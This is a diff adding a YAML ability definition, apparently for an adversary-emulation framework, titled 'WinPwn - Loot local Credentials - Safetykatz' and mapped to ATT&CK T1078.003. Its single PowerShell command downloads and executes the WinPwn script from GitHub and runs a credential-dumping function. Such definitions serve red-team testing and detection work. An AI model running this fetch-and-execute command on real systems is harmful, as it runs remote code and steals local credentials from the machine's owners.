@@ -1,0 +1,17 @@
+- description: Loot local Credentials - Safetykatz technique via function of WinPwn
+  id: d5378faa-065f-a434-ca49-8528362e18aa
+  name: WinPwn - Loot local Credentials - Safetykatz
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          safedump -consoleoutput -noninteractive
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1078.003
+    name: 'Valid Accounts: Local Accounts'
